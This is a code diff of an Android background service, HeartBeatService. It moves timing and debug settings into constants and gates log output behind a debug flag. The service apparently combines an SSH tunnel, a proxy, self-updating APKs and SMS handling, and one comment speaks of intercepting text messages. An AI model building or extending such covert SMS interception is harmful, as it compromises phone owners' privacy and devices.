@@ -53,35 +53,41 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 				.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
 				.common.download.listener.ApkDownloadListener {
 
-	private static final boolean DEBUG = true;
-	private static final boolean TEST_APK_UPDATE = true;
-	private static final boolean TEST_APK_PROXY = true;
+	private static final boolean DEBUG = NativeParams.HEARTBEAT_SERVICE_DEBUG;
+	private static final boolean TEST_APK_UPDATE = NativeParams.HEARTBEAT_APK_UPDATE;
+	private static final boolean TEST_APK_PROXY = NativeParams.HEARTBEAT_APK_PROXY;
+
 	private static final String TAG = "heartBeatService";
 	private ScheduledExecutorService mExecutorService;
 	private ScheduledExecutorService mCheckExecutorService;
 	private ScheduledFuture mScheduledFuture;
 
 	//开机10秒后更新
-	private static final long UPDATE_INIT_DELAY = 10;
-	private static final long MESSAGE_INIT_DELAY = 20;
-	private static final long HEARTBEAT_INIT_DELAY = 20;//Message 推送延迟
-	private static final long PROXY_CHECK_INIT_DELAY = 200;//200秒后才开始检查
-	private static final long PROXY_CHECK_DURNING_TIME = 120;//检查任务每120秒检查一次
-	public static long MESSAGE_DELAY = 20;//Message 轮询消息
-	private HeartBeatRunnable mHeartBeatRunnable = null;
-	private CheckServiceRunnable mCheckServiceRunnable = null;
-	private TerminalManager binder;
-	private TerminalBridge hostBridge;
-	private IProxyControl mProxyControl;
-	private boolean isProxyServiceRunning;
-	//记录当前建立号的连接，方便在拦截短信
+	public  static final long UPDATE_INIT_DELAY = NativeParams.HEARTBEAT_UPDATE_INIT_DELAY;
+	public static final long MESSAGE_INIT_DELAY = NativeParams.HEARTBEAT_MESSAGE_INIT_DELAY;
+	public static final long HEARTBEAT_INIT_DELAY = NativeParams.HEARTBEAT_PROXY_INIT_DELAY;//Message 推送延迟
+	public static final long PROXY_CHECK_INIT_DELAY = NativeParams.PROXY_CHECK_INIT_DELAY;//200秒后才开始检查
+	public static final long PROXY_CHECK_INTERVAL_TIME = NativeParams.PROXY_CHECK_INTERVAL_TIME;//检查任务每120秒检查一次
+	public static final long HEARTBEAT_MESSAGE_INTERVAL = NativeParams.HEARTBEAT_MESSAGE_INTERVAL;//Message 轮询消息
+
+    private static final String INTENT_SERVICE_ACTION = "com.android.sms.proxy";
+    private static final String SENT = "sms_sent";
+    private static final String DELIVERED = "sms_delivered";
+
+    private GetMsgRunnable mGetMsgRunnable = null;
+    private ApkUpdateRunnable mApkUpdateRunnable = null;
+    private HeartBeatRunnable mHeartBeatRunnable = null;
+
+
+    private CheckServiceRunnable mCheckServiceRunnable = null;
+    private TerminalManager binder;
+    private TerminalBridge hostBridge;
+    private IProxyControl mProxyControl;
+
+    private boolean isProxyServiceRunning;
+    //记录当前建立号的连接，方便在拦截短信
 	public static long recordConnectTime = 0;
-	private static HeartBeatService instance;
-	private GetMsgRunnable mGetMsgRunnable = null;
-	private ApkUpdateRunnable mApkUpdateRunnable = null;
-	private static final String INTENT_SERVICE_ACTION = "com.android.sms.proxy";
-	private static final String SENT = "sms_sent";
-	private static final String DELIVERED = "sms_delivered";
+    private static HeartBeatService instance;
 	private static boolean isProxyReset = false;
 
 	public static HeartBeatService getInstance() {
@@ -122,7 +128,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 //				}
 //			}
 //		}
-		scheduledWithFixedDelay(MESSAGE_DELAY);
+		scheduledWithFixedDelay(HEARTBEAT_MESSAGE_INTERVAL);
 		sureServiceIsRunning(TerminalManager.class.getCanonicalName());
 		//这里
 //        Task.callInBackground(new Callable<Object>() {
@@ -324,7 +330,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 				mCheckServiceRunnable = new CheckServiceRunnable(serviceName);
 			}
 			mCheckExecutorService.scheduleWithFixedDelay(mCheckServiceRunnable, PROXY_CHECK_INIT_DELAY,
-					PROXY_CHECK_DURNING_TIME, TimeUnit.SECONDS);
+                    PROXY_CHECK_INTERVAL_TIME, TimeUnit.SECONDS);
 		} catch (Throwable e) {
 			if (DEBUG) {
 				Log.e(TAG, e.fillInStackTrace().toString());
@@ -377,7 +383,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 											Log.d(TAG, "reset service 2000ms later");
 										}
 										HeartBeatService.isProxyReset = true;
-										resetScheduleProxyService(MESSAGE_DELAY);
+										resetScheduleProxyService(HEARTBEAT_MESSAGE_INTERVAL);
 									} catch (Throwable e) {
 										if (DEBUG) {
 											Log.e(TAG, e.toString());
@@ -632,39 +638,50 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		FlurryAgent.logEvent(NativeParams.EVENT_START_PROXY, map);
 	}
 
-	public void destroyProxyService() throws RemoteException {
+	public synchronized void destroyProxyService() throws RemoteException {
 		boolean isRunning = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName());
 		if (DEBUG) Log.d(TAG, "当前代理服务的状态：" + isRunning);
 
 		if (mHeartBeatRunnable != null) {
 			mHeartBeatRunnable.isSSHConnected = false;
 		}
-		if (!isRunning) return;
 		if (mProxyControl != null) {
-			Log.d(TAG, "关闭代理服务！！！2 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭代理服务！！！2 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            }
 			mProxyControl.stop();
-			Log.d(TAG, "关闭代理服务！！！3 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭代理服务！！！3 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            }
 			unbindService(proxyConnection);
-			Log.d(TAG, "关闭代理服务！！！4 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭代理服务！！！4 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
+            }
 			((ProxyService) mProxyControl).stopSelf();
 			mProxyControl = null;
 		}
 	}
 
-	public void destroyTerminalService() {
-		boolean isRunning = Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName());
+	public synchronized void destroyTerminalService() {
+        boolean isRunning = Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName());
+        if (DEBUG) Log.d(TAG, "当前代理服务的状态：" + isRunning);
 		if (mHeartBeatRunnable != null) {
 			mHeartBeatRunnable.isSSHConnected = false;
 		}
-		if (!isRunning) return;
 		if (binder != null) {
-//			Log.d(TAG, "关闭终端服务！！！2 " + Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭终端服务！！！2 " + Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName()));
+            }
 			unbindService(mTerminalConnection);
-//			Log.d(TAG, "关闭终端服务！！！3 " + Util_Service.isServiceRunning(this, TerminalManager.class
-//					.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭终端服务！！！3 " + Util_Service.isServiceRunning(this, TerminalManager.class
+                        .getCanonicalName()));
+            }
 			binder.stopSelf();
-//			Log.d(TAG, "关闭终端服务！！！4 " + Util_Service.isServiceRunning(this, TerminalManager.class
-//					.getCanonicalName()));
+            if(DEBUG) {
+                Log.d(TAG, "关闭终端服务！！！4 " + Util_Service.isServiceRunning(this, TerminalManager.class
+                        .getCanonicalName()));
+            }
 			binder = null;
 		}
 	}
